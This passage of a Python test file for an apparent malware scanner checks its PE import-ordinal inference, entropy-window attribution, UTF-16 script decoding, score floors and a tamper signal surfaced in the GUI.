    assert len(partial) == 1
    assert 0 < partial[0].points < 45  # strictly less than the named combo
    assert "infer" in partial[0].explanation.lower()
    assert "process_injection_combo" not in _names(signals)


def test_hunt_p1_22_partial_needs_80_percent_and_three_imports():
    # 3 ordinals of 5 = 60% — below the pinned 80%.
    pe = _pe_with_imports(
        {"KERNEL32.dll": ["#1", "#2", "#3", "ExitProcess", "GetProcAddress"]}
    )
    assert "ordinal_hidden_combo_suspect" not in _names(
        pe_signals(pe, StringIndex(), EntropySummary())
    )
    # Only 2 imports — below the pinned minimum of 3.
    pe2 = _pe_with_imports({"KERNEL32.dll": ["#1", "#2"]})
    assert "ordinal_hidden_combo_suspect" not in _names(
        pe_signals(pe2, StringIndex(), EntropySummary())
    )
    # A DLL outside the combo set earns no combo inference.
    pe3 = _pe_with_imports({"USER32.dll": ["#1", "#2", "#3", "#4"]})
    assert "ordinal_hidden_combo_suspect" not in _names(
        pe_signals(pe3, StringIndex(), EntropySummary())
    )
    # Exactly 80% (4 of 5) does fire.
    pe4 = _pe_with_imports(
        {"KERNEL32.dll": ["#1", "#2", "#3", "#4", "ExitProcess"]}
    )
    assert "ordinal_hidden_combo_suspect" in _names(
        pe_signals(pe4, StringIndex(), EntropySummary())
    )


# ======================================================================
# P2 — detection batch
# ======================================================================
def _clean_info(tmp_path):
    target = tmp_path / "c.exe"
    target.write_bytes(clean_pe())
    info = parse_pe(target)
    for sec in info.sections:
        sec.entropy = 6.0
    return info


def test_hunt_p2_entropy_window_requires_dominant_section(tmp_path):
    info = _clean_info(tmp_path)
    text = info.sections[0]
    # A window that merely STRADDLES the section end: 100 bytes
    # inside .text, the remaining ~4 KB outside every section.
    straddle = EntropyRegion(
        offset=text.raw_offset + text.raw_size - 100,
        length=4096,
        entropy=7.9,
    )
    signals = pe_signals(
        info, StringIndex(), EntropySummary(high_regions=[straddle])
    )
    assert "high_entropy_window_in_section" not in _names(signals)
    # A window DOMINATED by .text (fully inside it) attributes.
    inside = EntropyRegion(
        offset=text.raw_offset, length=4096, entropy=7.9
    )
    signals2 = pe_signals(
        info, StringIndex(), EntropySummary(high_regions=[inside])
    )
    assert "high_entropy_window_in_section" in _names(signals2)


def test_hunt_p2_decode_script_requires_interleave_not_nul_density():
    from argus.heuristics.analyze import _decode_script

    # Scattered NULs at ~30% density, NOT alternating: must not be
    # folded into UTF-16 (the decoded text keeps its NULs and does
    # not become a readable script).
    blob = bytearray(b"ABCD" * 64)
    for i in range(3, len(blob), 13):
        blob[i] = 0
    decoded = _decode_script(bytes(blob))
    assert "\x00" in decoded
    # Genuine BOM-less UTF-16LE decodes cleanly.
    text = _decode_script("Write-Host 'hello world, this is a script'".encode("utf-16-le"))
    assert text.startswith("Write-Host")


def test_hunt_p2_hot_pocket_floor_survives_signed_trim():
    pocket = _signal("high_entropy_window_in_section", 15, "medium")
    scored = score_signals([pocket], signed=True)
    assert scored.score == 15  # the trim cannot dilute it to zero
    mixed = score_signals(
        [pocket, _signal("something_else", 10, "low")], signed=True
    )
    assert mixed.score >= 15


def test_hunt_p2_oversize_floor_survives_signed_trim():
    floor = _signal("oversize_not_fully_analyzed", 25, "medium")
    scored = score_signals([floor], signed=True)
    assert scored.score >= 25
    assert scored.verdict is Verdict.SUSPICIOUS


def test_hunt_p2_tamper_signal_on_standard_scannedfile_surface(db, tmp_path):
    """The GUI reads ScannedFile.assessment.signals (scan_result_
    row flattens exactly that) — the tamper signal and note must
    be THERE for a tamper suspect, with heuristics on AND off."""
    from argus.gui.format import scan_result_row

    exe = _exe(tmp_path, clean_pe())
    exclusions = SelfExclusions(
        own_exe=exe, recorded_exe_sha256=_sha(b"the-real-argus")
    )
    for heuristics in (True, False):
        scanned = scan_file(
            exe, db, [], heuristics=heuristics, self_exclusions=exclusions
        )
        assert scanned.excluded is False
        assert "argus_program_file_replaced" in _names(scanned.assessment.signals)
        assert any(
            "tamper indicator" in note for note in scanned.assessment.notes
        )
        assert scanned.verdict is Verdict.SUSPICIOUS
        row = scan_result_row(scanned)
        assert any(
            "argus_program_file_replaced" in reason for reason in row["reasons"]
        )
